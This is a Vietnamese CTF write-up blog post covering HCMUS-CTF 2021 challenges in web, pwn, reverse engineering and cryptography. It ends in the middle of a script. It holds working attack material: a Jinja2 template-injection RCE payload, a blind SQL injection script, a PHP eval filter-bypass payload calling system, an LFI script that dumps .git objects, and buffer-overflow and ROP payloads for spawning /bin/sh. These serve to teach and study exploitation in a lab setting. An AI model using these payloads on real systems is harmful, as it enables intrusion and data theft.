---
layout: post
title: WRITE-UP HCMUS-CTF-2021-AQUALS
image: hcmus-ctf-2021/background.jpg
date: 2021-05-29 22:00:00 +0700
tags: [ctf, hcmus]
categories: ctf
---


### <u>*<center>nOnSlaS</center>*</u>


| Challenge type                                             | 
| ------------------------------------------------------------ | 
| [WEB](#WEB) | 
| [PWNABLE](#PWNABLE) | 
| [REVERSE](#RE) | |
| [CRYPTOGRAPHY](#CRYPTOGRAPHY) | 
| [MISC](#MISC) |
| [FORENSIC](#FORENSIC) |


# <a name="WEB"></a>WEB

------

### Nothingness

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/1.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/1.png)
Trang web khi vào sẽ hiển thị ra như trên, nhưng có vẻ là `URL path` được nhắc đến ở đây nên ta thử nhập một `path` bất kỳ nào đấy lên URL để xem như thế nào

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/2.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/2.png)
Và phần `path` được render lại, theo kinh nghiệm của mình có thể đây là lỗi `Server-side template injection` nên test thử và chính xác là như thế.

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/3.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/3.png)
Ở đây ta có thể thấy ở phần `response header` là webserver đang sử dụng `Python` để chạy => Rất có thể là `Jinja2`.
[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/4.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/4.png)
Sau khi đã xác định được `target` và cũng như `vulnerability` thì ta tiến hành tìm cách để đọc `flag`.
Thử fuzz với template `{{config.items()}}` để đọc được các giá trị cấu hình trên server và rất có thể là flag nằm trong đó.

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/5.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/5.png)
Và tất nhiên là đời không như là mơ, giờ tìm cách `RCE` để tìm ra file flag.
Payload: `{{config.__class__.__init__.__globals__['os'].popen('<command>').read()}}`

Và `flag` nằm ở thư mục root
[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/6.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/6.png)

Đọc flag nà!!
[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/7.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/nothingness/7.png)

> Flag: `HCMUS-CTF{404_teMpl4t3_1njEctIon}`

###  EasyLogin

Bài cho ta một form login, và thử ngay thì biết được dính lỗi `SQL injection` và đang sử dụng `SQLite3`. Nhưng thử bypass login với `admin` thì được kết quả như này =))

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/easylogin/1.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/easylogin/1.png)
Ban đầu cứ nghĩ là password của admin là `flag` nên mình đã viết script để blind cái password nhưng khi có password login vào thì vẫn vậy -.-
Nên dựa vào hình trên có thể đoán được là `flag` đang nằm trong bảng khác, đoán query đằng sau là `SELECT * FROM users WHERE username='input' and passwd='input'`
Sau đấy viết lại script để exploit thì được tên bảng

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/easylogin/2.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/easylogin/2.png)

Script exploit:

```
#!/usr/bin/env python3
import requests
import string

r = requests.Session()
url = 'http://61.28.237.24:30100/'
flag = ''
index = 1
table_name = 'flagtablewithrandomname'
flag = 'HCMUS-CTF{easY_sql_1nj3ctIon}'

while True:
	for c in string.printable.replace('%', ''):
		# Get table structure
		#payload = f"' or substr((select sql from sqlite_master where tbl_name != 'users'),{index},1)='{c}'--" 

		#Get flag
		payload = f"' or substr((select group_concat(flag) from flagtablewithrandomname),{index},1)='{c}'--" 
		data = {'username': payload, 'passwd': '123'}
		resp = r.post(url , data = data)
		if "Nothing special here. Maybe an admin account will work?" in resp.text:
			flag += c
			index += 1
			print(flag)
			break
		if c == '}':
			exit()
```

> Flag: `HCMUS-CTF{easY_sql_1nj3ctIon}`

###  SimpleCalculator

Web có chức năng cho ta nhập vào một biểu thức gì gì đó, sau đó tính toán các kiểu rồi trả về result thông qua biến query `equation`. Ta thử nhập vào một mảng xem như thế nào

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/simplecalc/1.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/simplecalc/1.png)
Theo như reponse trả về, ta biết được code đằng sau sử dụng hàm eval để thực hiện tính biểu thức đó. Vậy giờ việc cần làm là tìm cách `RCE` thông qua chức năng này!!!
Thử thực thi hàm `phpinfo()` xem như thế nào

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/simplecalc/2.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/simplecalc/2.png)
Ô cê! i'm fine =((. Và tất cả `ký tự chữ cái [a-zA-Z]` và các dấu như `quote('), double-quote("), backtick(`)` đều được filter kỹ càng! Hmmm... Liền thử ngay kỹ thuật `XOR string` để bypass filter nhưng lại bị `giới hạn về ký tự (chỉ 19 ký tự)` nhưng theo kiến thức mình biết được thì ta có thể bypass bằng cách sử dụng dấu `~` để lấy phủ định của một chuỗi.

Ví dụ: `~"_GET"` sẽ cho ra các ký tự không nằm trong alphabet nên khi gửi lên server chỉ cần lấy phủ định lại của kết quả đó là có thể bypass được filter. Ngoài ra việc gọi tên một biến theo cách truyền thống là `$variable` thì ta cũng có thể gọi `${'variable'}`.

Payload mà đội mình dùng để đọc file flag: `?equation=${~%A0%B8%BA%AB}[0](~%91%93%DF%D0%D5)&0=system`
Giải thích sơ qua về payload:

- `${~%A0%B8%BA%AB}[0] = ${'_GET'}[0]` nghĩa là lấy tên hàm qua biến query `0`.
- `~%91%93%DF%D0%D5 = nl /*` là argument đặt trong function trên và thay cho `cat /*`

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/simplecalc/3.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/simplecalc/3.png)

> Flag: `HCMUS-CTF{d4ngErous_eVal}`

###  GITchee-gitchee-goo

Ở đây, ta có thể dễ dàng fuzz được `LFI` tại ô input dưới đây => từ chổ này, ta có thể đọc bất kỳ file nào trên hệ thống (nếu được phép)

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/1.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/1.png)
Mình đã thử những kỹ thuật về LFI đã biết nhưng có vẻ không khả quan, sau đó check `robots.txt`

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/2.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/2.png)
Ồh có một folder `.git` nhưng khi truy cập thì trả về 403 =(((

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/3.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/3.png)
Nhưng có thể đoán được ý tác giả bắt ta đọc các file trong `.git` thông qua `LFI` này!! Ok và đến lúc dùng `Google` rồi XD.

Giờ việc đầu tiên ta cần tìm hiểu là về `structure` của folder `.git` đó ([Link tham khảo](https://openclassrooms.com/en/courses/5671626-manage-your-code-project-with-git-github/6152251-explore-gits-file-structure#:~:text=git directory holds the meat,gets its own sub folder.))

Nhưng ta chỉ cần nhớ mấu chốt ở ổ này là khi các bạn thêm file nào đó vào trong một commit, thì những file đó sẽ được `encrypt`, `compress` và được chứa như là một object được gọi là `blobs` và sử dụng thuật toán `SHA-1` cho mỗi `blob` để định danh riêng cho nó (ngoài ra còn có các khái niệm `tree` và `commit` nữa). Và thư mục `objects` trong folder `.git` là nơi chứa những thứ đó. Thêm một điều mà mình biết nữa là các file trong commit được compress bằng `zlib`. Vậy nên ta chỉ cần kéo các `blob` này về và `decompress với zlib` là ta có thể đọc được những file đã được thêm vào `repo`.

Và ở đây mình sẽ dùng `php wrapper` để đọc dữ liệu dưới dạng `base64` để tránh trường hợp đọc thiếu, sót các byte rồi dẫn đến lỗi trong quá trình `decompress`. Nên việc đầu tiên mình cần làm là đọc và lưu những file cơ bản về trước đã

```
# get_file.py

#!/usr/bin/env python3
import requests
import re
import os
import zlib
import base64
import sys

url = 'http://61.28.237.24:30102/'
r = requests.Session()

tasks = [
        ".gitignore",
        ".git/COMMIT_EDITMSG",
        ".git/description",
        ".git/hooks/applypatch-msg.sample",
        ".git/hooks/commit-msg.sample",
        ".git/hooks/post-commit.sample",
        ".git/hooks/post-receive.sample",
        ".git/hooks/post-update.sample",
        ".git/hooks/pre-applypatch.sample",
        ".git/hooks/pre-commit.sample",
        ".git/hooks/pre-push.sample",
        ".git/hooks/pre-rebase.sample",
        ".git/hooks/pre-receive.sample",
        ".git/hooks/prepare-commit-msg.sample",
        ".git/hooks/update.sample",
        ".git/index",
        ".git/info/exclude",
        ".git/objects/info/packs",
        ".git/FETCH_HEAD",
        ".git/HEAD",
        ".git/ORIG_HEAD",
        ".git/config",
        ".git/info/refs",
        ".git/logs/HEAD",
        ".git/logs/refs/heads/master",
        ".git/logs/refs/remotes/origin/HEAD",
        ".git/logs/refs/remotes/origin/master",
        ".git/logs/refs/stash",
        ".git/packed-refs",
        ".git/refs/heads/master",
        ".git/refs/remotes/origin/HEAD",
        ".git/refs/remotes/origin/master",
        ".git/refs/stash",
        ".git/refs/wip/wtree/refs/heads/master",  # Magit
        ".git/refs/wip/index/refs/heads/master"  # Magit
    ]
def get_token():
	resp = r.get(url)
	return re.findall(r'<input name="token" value="(.*)" hidden>', resp.text)[0]

def lfi(file_name):
	resp = r.post(url, data={'token':get_token(), 'song': 'php://filter/convert.base64-encode/resource='+file_name})
	return resp.text.split('</pre><html>')[0].replace('<pre>','')

for task in tasks:
	try:
		directory = task[0:task.rindex('/')+1]
		if not os.path.exists(directory):
			os.makedirs(directory)
		f = open(f'{task}', 'wb')
		data = lfi(task)

		if "failed to open stream" not in data:
			f.write(base64.b64decode(data))
		else:
			pass
		f.close()
	except:
		pass
```

Sau khi có khung rồi thì ta tiến hành đọc `log` ở `.git/logs/HEAD` và có thể thấy là những hash của những `commit` đã được liệt kê sẵn ở đây hết. Về cấu trúc lưu trữ object như sau:

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/4.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/4.png)
Sẽ lấy 2 ký tự đầu của `hash` làm folder và 38 ký tự còn lại làm `file name`. Giờ chỉ cần clone từng cái về và dùng git để đọc các `blob` tiếp theo rồi kéo về và cứ thế đọc hết tất cả file đã được `commit` trước và sau kể từ lúc bắt đầu mà thôi.

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/5.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/5.png)

```
# get_object.py  
  
#!/usr/bin/env python3  
import requests
import re
import os
import zlib
import base64
import sys

url = 'http://61.28.237.24:30102/'
r = requests.Session()

def get_token():
	resp = r.get(url)
	return re.findall(r'<input name="token" value="(.*)" hidden>', resp.text)[0]

def lfi(file_name):
	resp = r.post(url, data={'token':get_token(), 'song': 'php://filter/convert.base64-encode/resource='+file_name})
	return resp.text.split('</pre><html>')[0].replace('<pre>','')

task = sys.argv[1]
#task = '.git/objects/26/f83e27e96c7371129f76ac70b58f0787153c82'
directory = task[0:task.rindex('/')+1]

if not os.path.exists(directory):
	os.makedirs(directory)

f = open(f'{task}', 'wb')
data = lfi(task).strip()
data = base64.b64decode(data)
f.write(data)
compressed_contents = data
decompressed_contents = zlib.decompress(compressed_contents)
print(decompressed_contents)
f.close()
$ python3 get_object.py ".git/objects/17/d14ffb4be92ef2b63c070307aa43774ccd9d65" // hash = 17d14ffb4be92ef2b63c070307aa43774ccd9d65
```

Nếu ta gặp lỗi khi dùng `git log` ví dụ như:
[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/6.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/6.png)

Thì cứ tiếp tục clone đến khi nào hết báo lỗi thì thôi XD
Sau một hồi hì hục clone thì cũng hoàn thành, giờ tìm flag thôi!! Lúc này mình nghĩ rằng rất có thể tác giả đã chèn flag vào trong file nào đó rồi lại xoá đi cũng nên, vì vậy mục đích của mình là đọc lại những file cũ từ lúc init đến hiện tại => Vẫn dùng cách cũ là clone từng `object` về thôi.

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/7.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/7.png)
Ở đây mình thấy các file như sau:

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/8.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/8.png)
Ở đây thấy 1 cái ảnh, có hash là `5531e1ff740b1dbafc79f315f266d54738938450` nên nhanh chóng dùng script ở trên clone về

```
$ python3 get_object.py ".git/objects/55/31e1ff740b1dbafc79f315f266d54738938450"
$ git cat-file -p 5531e1ff740b1dbafc79f315f266d54738938450 > image.png
```

Và ta có flag XD

[![img](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/9.png)](https://kcsc-club.github.io/images/hcmus-ctf-2021/web/git/9.png)

> Flag: `HCMUS-CTF{mOt1vaT3d_by_0ld_m3Mory}`

-----

# <a name="PWNABLE"></a>PWNABLE

### BANK 1

*<u>BOF</u>*

Chèn một chuỗi kí tự dài gây tràn bộ đệm.

> HCMUS-CTF{that_was_easy_xd}

### BANK 2

Lỗi xảy ra ở hàm Register() dùng gets (tràn bộ đệm). Dẫn tới có thế ghi đè biến balance để đọc flag.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/1.png)      

Payload: cyclic(64) + p32(0x66a44)

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/2.png)   

### BANK 3

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/3.png)   

Bài này giống tương tự với bài trên. Thay vì ghi đè biến balance thì sẽ phải ghi đè địa chỉ trở về đến hàm getFlag().

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/4.png)   

Payload: cyclic(0x4c + 4) + p32(0x8048506)
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/5.png)   


### BANK 4

![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/6.png)   


Tương tự lỗi như 2 bài trên. Nhưng bài này hàm đọc flag có kèm điều kiện:
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/7.png)   


Ở đây bắt buộc o1, o2 phải khác 0.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/8.png)   

Ta có 2 hàm thay đổi giá trị o1, o2.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/9.png)   
 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/10.png)   


Up1 sẽ kiểm tra o2 nên ta sẽ ghi đè địa chỉ trở về hàm up2 với các đầu vào thỏa mãn để tăng o2 trước. Sau đó nhảy về up1 để tăng o1 là xong.

Bắt đầu với up2. Đều kiện là param1 == param2 và param3 == 0x12345678.

Đơn giản là ghi đè địa chỉ trở về, tiếp theo đè tiếp bên dưới lần lượt là địa chỉ hàm main và 3 tham số. Vì lười căn chỉnh stack lại để gọi tiếp nên đơn giản mình cho quay về main làm lại 1 lần như vậy nữa là xong.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/11.png)   

Bước 2 ghi đè địa chỉ đến up1, bên dưới là địa chỉ hàm đọc flag và tiếp theo là các tham số.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/12.png)   

### BANK 5

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/13.png)   

Với bài này thì cũng là tràn bộ đệm gets. Nhưng không có hàm đọc flag easy như những bài phía trên.

Ngồi search hàm từ khóa sys trong bảng fuction thì tìm được hàm dl_sysinfo_int80() thực thi int 80.
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/14.png)   


Vậy làm cách nào đó cho các thanh ghi eax = 0xb, ebx trỏ đến /bin/sh, ecx, edx = 0 rồi trỏ đến đó là được.

Đầu tiên ta sẽ ghi chuỗi /bin/sh vào bss. Bằng cách ghi đè địa chỉ trở về đến hàm gets với đầu vào là địa chỉ bss.
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/15.png)   


Bước cuối cùng là sẽ dùng ROP để 0xb, 0, 0 lần lượt vào eax, ecx, edx.

(pop eax, ret; pop ecx, ret; pop edx, 0, ret;)

Còn đối với ebx. Ta sẽ lợi dụng mov ebx, [ebp – 4] để ghi địa chỉ bss vào ebx.

Sau đó sẽ gọi đến dl_sysinfo_int80() là xong.
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/16.png)   


### BANK 6

![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/17.png)   


Với bài này thì không thấy có NX nên sẽ xem xét thực thi shellcode trên stack cho lẹ.

Nhưng với %1036s thì ta không thể ghi đè được địa chỉ trở về.

Nhưng ta có thể ghi đè được bytes cuối của ebp do cơ chết scanf và lợi dụng leave retn để control EIP về shellcode.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/18.png)   
 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/19.png)   

Payload:
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/20.png)   



### My birthday

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/21.png)   

Ghi dè biến v8 => 0Xcabbfeff
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/22.png)   


----

# <a name="RE"></a>RE


### Faded

Nhìn qua thì đây là 1 file python được compile thành ELF 

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/23.png)   

Ban đầu dùng pyinstxtractor thấy có lỗi không hỗ trợ. Google 1 lúc thì thấy có hướng dẫn dùng pyi-archive_viewer 

https://reverseengineering.stackexchange.com/questions/19900/decompile-python-for-elf-binaries
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/24.png)   


Ta extract file authentication ra và ném vào CFF coi qua magic thì thấy có chuỗi flag.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/25.png)   

### RealMalware1 

Đề bài cho source encrypt và 1 folder bị encrypt.

Copy 1 đoạn ở hàm encrypt1 trong source để google thì phát hiện nó được mã hóa bằng thuật toán XTEA.

Đối với các đuôi file không nằm trong list thì sẽ được mã hóa đơn giản bằng hàm xor.
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/26.png)   




Bây giờ sẽ copy đoạn code ở trên ném vào source đã cho chỉnh sửa 1 chút để bruteforce key thế là xong (key 4 bytes).

Những đoạn sửa
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/27.png)   


Bruteforce key

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/28.png)   

Kiểm tra magic file.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/29.png)   

Xóa bớt file đi để lai file flag.png thôi.
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/30.png)   










Thay vì gọi encrypt1 thì ta sẽ đổi thành decipher.
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/31.png)   




Hàm decrypt.
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/32.png)   




Sau khi brute thành công có ngay KEY = [0,0,0,0]

  ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/33.png)   

 

 

### M_vm

Đề bài là một vmcode như bao bài vmcode khác.
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/34.png)   


Nói chung đây là một bài vm nhỏ và khá đơn giản.

Đây là nơi in ra thông báo và nhận input từ người dùng.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/35.png)   

 

 

Mỗi lần lấy 4 ký tự trong chuỗi ta nhập vào và kiểm tra thông qua xor và sum.

Case 0x34535888 là nơi sẽ lấy 4 gán vào v19: ban đầu là 0xDEADBEEF và quay lên case 0x83660101 xor với 4 bytes ký tự của ta. 

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/36.png)   

Sau đó kết quả xor được sẽ mang đi sum với key khác mà mặc định ở đây theo như phân tích thì luôn là 0x13371337

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/37.png)   



 

0x11112222 là lấy kq từ 2 lần tính toán trên và gán vào vm.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/38.png)   

Tại đây lấy ra kết quả cần so sánh.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/39.png)   

 

Kiểm tra hai kết quả khớp hay không và gán giá trị True False vào (vm + 24)

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/40.png)   

Thực hiện kiểm tra.

![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/41.png)    

Rồi cứ như vậy kết quả đó lại trở thành key đem đi xor với 4 ký tự sau rồi lại cộng với 0x13371337 sau đó kiểm tra.

 

 

Gía trị cần so sánh đầu tiên nằm ở offset 80 của vm và những giá trị sau nằm cách đó 52 bytes.

Vì bài cũng đơn giản nên không cần dump rồi code lại lắm. Ta chỉ cần dump các giá trị cần so sánh và khởi tạo 2 key là key1 = (vm + 80) và key2 = 0x13371337 giải rồi giải ngược lại là xong.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/42.png)   



### weird protocol

Bài này thì liên quan đến việc giao tiếp trao đổi dữ liệu thông qua socket mô hình client server. Bài này 2 cách giải mình sẽ trình bày cả 2 cách.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/43.png)   

Thực hiện drop binary từ resource.

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/44.png)   

 

 

 

 

Mở process server

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/45.png)   

Dùng CFF dump luôn cho lẹ.

 

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/46.png)   

 

 

Phân tích luôn file vừa dump
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/47.png)   
 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/48.png)   

 

Với việc không tìm thấy đoạn string nào là HCMUS-CTF{} nên khả năng cao là format nằm trong cipher lúc giải ra luôn giống như mấy bài trước. 

Vậy lại buteforce vì thấy % len, đoán có thể key ngắn nên có thể tìm được key ở những đoạn lặp lại lúc brute bằng format flag. Thế thì nếu thành công thì cả đống code trên coi như không cần tốn sức đụng đến. Bên dưới là script.

 

 

Đây dồi lụm. Hóa ra là ngắn thật key = [104,101,108,108,111]
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/49.png)   


Gòi viết 1 đoạn decrypt hết lụm flag.
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/50.png)   


Hoặc có thể Reverse đoạn thuật toán phía trên chính là SHA256. Đem 32 bytes đó đi google search thì sẽ có key.

Cụ thể hơn nhá ta sẽ leak đống hex ở trên ra và gộp lại thành chuỗi hex sha256 rồi đi google.
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/51.png)   


Đây dùng sublime cho lẹ.
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/52.png)   


Dòi đi google ta nhận được key là ‘hello’

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/53.png)   

### Bhide

Đề bài là 1 file thực thi .NET và 1 ảnh giấu tin. Này thì thực sự không phải sở trường nhưng để coi vì bữa trước vừa thuyết trình phần này.

Cụ thể sẽ giấu text từ 1 file vào vào hình.

Mấu chốt thì nằm ở 2 hàm
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/54.png)   


Và

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/55.png)   

Quy luật của thuật toán này như sau nó sẽ bóc tách từng bit của byte cần giấu và giấu vào từng byte trong ảnh.

Ban đầu thì tưởng nó là LSB nhưng lại không phải. Ta có các tham số đầu vào sau:

Param ll biểu thị cho vị trí bit được giấu vào.

Param vv là bit cần giấu vào vị trí đó.

Nếu ll = 1 thì giấu vào bit thứ 2 từ phải qua, = 0 thì bit đầu đầu tiên chỉ có vậy thôi.

Nhiệm vụ là cần bóc tách các bit đã giấu ra và gộp thành các bytes như ban đầu.

Bước 1: Chúng ta sẽ trích xuất vùng bytes nơi được giấu tin. Ta debug bằng dnspy và dump ra.
![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/56.png)   


Sau khi có được dữ liệu cần xử lý thì tiến hành code nhặt các bit đã giấu.


![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/57.png)   




Sau đó mở file ta sẽ được hình có chứa flag:

 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/58.png)   

### Android_rev

 Ở bài này ta có flag được tách ra làm 5 phần thông qua ‘–‘. Ký tự đó thì được giải thông qua 10 lần base64.
 ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/59.png) 
Vậy chỉ cần đi search database md5 trên google thử.

  ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/62.png)  
  ![1](https://kcsc-club.github.io/images/hcmus-ctf-2021/rev/63.png)  

 

----



# <a name="CRYPTOGRAPHY"></a>CRYPTOGRAPHY

### SanityCheck

> Welcome to HCMUS_-CTF 2021. We're Blackpinker.
> author: pakkunandy
> [encoded](https://github.com/hhthanhuyen/Writeups/blob/main/HCMUS-CTF-2021/challenges/encoded)

```
MQZGQ3K2PFBDMYTONB4USR3YNFQUGQTJLEZUU2CJI5UGUSKHPBUWCR2VM5RW26DZLJTW6S2WKZBGCU2FLF2FKRLEKRSTA4DZLAZDK3DDNQ4VAZKXGV3WKR2OGJMVQ2DZLJLDS4LDNZWHOWLOOB4VQMTENFMDGVTXMVWWQ3KYGNBG4YZRHB4U2RCJPBTFCPJ5
```

Mở đầu là một bài sanity check, flag được encode lần lượt bằng rot13, base64 và base32, decode theo thứ tự ngược lại là được flag.

```
>>> import base64
>>> import codecs
>>> c = 'MQZGQ3K2PFBDMYTONB4USR3YNFQUGQTJLEZUU2CJI5UGUSKHPBUWCR2VM5RW26DZLJTW6S2WKZBGCU2FLF2FKRLEKRSTA4DZLAZDK3DDNQ4VAZKXGV3WKR2OGJMVQ2DZLJLDS4LDNZWHOWLOOB4VQMTENFMDGVTXMVWWQ3KYGNBG4YZRHB4U2RCJPBTFCPJ5'
>>> print(codecs.decode(base64.b64decode(base64.b32decode(c)).decode(), "rot13"))
just make you open up your eyes

HCMUS-CTF{We_are_Blackpinker_welcome_to_hcmus_ctf_2021}
```

------

### SingleByte

> Yup!!!! You know it!!! The very simple encryption technique that has the perfect secrecy.
> author: pakkunandy
> [ciphertext.txt](https://github.com/hhthanhuyen/Writeups/blob/main/HCMUS-CTF-2021/challenges/ciphertext.txt)

```
r4SJmJOanoOFhMqDmcqLyp2Lk8qFjMqZiZiLh4iGg4SNyo6LnovKmYXKnoKLnsqFhIaTyoufnoKFmIOQj47KmouYnoOPmcqJi4TKn4SOj5iZnouEjsqego/Kg4SMhZiHi56DhYTEyqOEyp6PiYKEg4mLhsqej5iHmcbKg57Kg5nKnoKPypqYhYmPmZnKhYzKiYWEnI+YnoOEjcqCn4eLhMeYj4uOi4iGj8qahouDhJ6Pkp7KnoXKg4SJhYeamI+Cj4SZg4iGj8qej5KexsqLhpmFyoGEhZ2EyouZyomDmoKPmJ6Pkp6iqae/ucepvqyRnY+1gYSFnbWegouetZOFn7WJi4S1joW1mYOHmoaPtbKluLXf3tnb2dvf3ouIiYyP396LjNiPiYuIlw==
```

Single-byte XOR cipher, mỗi ký tự của bản rõ được XOR với cùng một byte, tìm lại byte này bằng cách thử 256 khả năng.

```
>>> from base64 import b64decode
>>> from pwn import xor
>>> f = open("ciphertext.txt","rb").read()
>>> f = b64decode(f)
>>> for i in range(256):
...     x = xor(f, bytes([i]*len(f)))
...     if b"HCMUS-CTF" in x:
...         print(x.decode())
... 
Encryption is a way of scrambling data so that only authorized parties can understand the information. In technical terms, it is the process of converting human-readable plaintext to incomprehensible text, also known as ciphertextHCMUS-CTF{we_know_that_you_can_do_simple_XOR_54313154abcfe54af2ecab}
```

------

### TheChosenOne

> The cryptography technique can be good, but the implementation is bad. Do you know the weakness of AES-ECB? (Inspired from some old stuff with a little bit easier =D )
> https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation
> nc 61.28.237.24 30300
> author: pakkunandy
> [server.py](https://github.com/hhthanhuyen/Writeups/blob/main/HCMUS-CTF-2021/challenges/server.py)

```
[...]
plaintext = user_input + flag
padding_length = padding(plaintext)
plaintext = plaintext.ljust(padding_length, padding_character)

sys.stdout.write('The ciphertext:\n{}\n\n'.format((cipher.encrypt(plaintext)).encode('hex')))
```

Server cho phép nhập vào một chuỗi, sau đó trả về bản mã AES-ECB(pad(user_input || flag)), lưu ý mã khối ở chế độ ECB không an toàn, hai khối bản rõ giống nhau sẽ có hai khối bản mã giống nhau. Như vậy có thể tìm lại từng chữ của flag bằng cách so sánh hai khối, trong đó `?` là một byte dùng để brute force những chữ có thể của flag.

```
1234567890123456
aaaaaaaaaaaaaaa?  <- user_input = aaaaaaaaaaaaaaa?aaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaH

aaaaaaaaaaaaaaH?  <- user_input = aaaaaaaaaaaaaaH?aaaaaaaaaaaaaa
aaaaaaaaaaaaaaHC

aaaaaaaaaaaaaHC?  <- user_input = aaaaaaaaaaaaaHC?aaaaaaaaaaaaa
aaaaaaaaaaaaaHCM

[...]
from pwn import remote, xor

r = remote("61.28.237.24", 30300)
r.recvuntil("Your input: ")
flag = ""

for i in range(15,-1,-1):
